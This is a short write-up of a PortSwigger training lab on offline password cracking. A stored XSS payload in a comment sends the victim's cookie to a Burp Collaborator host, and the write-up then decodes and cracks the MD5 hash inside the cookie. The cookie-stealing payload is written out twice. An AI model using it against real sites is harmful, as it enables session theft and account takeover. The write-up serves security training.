# Offline password cracking

> **Vulnerability Type:** Authentication  
> **Lab URL:** [Authentication Lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

---

## Objective  
Use the present XSS vulnerability to obtain the stay logged in cookie of the user "carlos" then use the cookie to crack his password, log into his account and delete the account from the "my account" page.

---

## Setup  
- **Tools Used:** Burp Suite  
- **Environment Details:** PortSwigger Lab  

---

### 1. **Discovery**  
- **Initial Observations:**  
  - Found the comment section and verified it was vulnerable to XSS by putting `<img src=1 onerror=alert(1)>` into the comment input and refreshing the page causing the alert function to be called.
- **Testing Approach:**  
  - Use the XSS vulnerability to get the cookie from carlos - `<img src=1 onerror=document.location='https://.oastify.com?c=' document.cookie>` decoding the acquired stay logged in cookie in base64 goes from
  - `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` to `carlos:26323c16d5f4dabff3bb136f2460a943` putting the hash into my search bar brought me to md5hashing.net which stated the decoded value was "onceuponatime"
  - which allowed me to login to carlos' account. I then visited the "my account page" deleted the account and completed the lab.
---
### 2. **Exploitation**  
- **Payload Used:**  
  ```XSS
  <img src=1 onerror=document.location='https://.oastify.com?c=' document.cookie>  
  ```
### 3. **Screenshots**
The HTTP request with the XSS payload (the payload has been URL encoded)
![Screenshot 2025-03-05 182029](https://github.com/user-attachments/assets/f68ca80c-37d7-4971-b601-fd0670180f2e)
Burp Collaborator with carlos' cookie
![Screenshot 2025-03-05 182042](https://github.com/user-attachments/assets/b3dc5f14-ce7e-453f-8493-6e8b7ba28f6c)
Decoding the cookie from base64 in burp repeater to get the ```username:hash```
![Screenshot 2025-03-05 182114](https://github.com/user-attachments/assets/111dc2ee-cc6e-4af8-8332-33553db88be4)
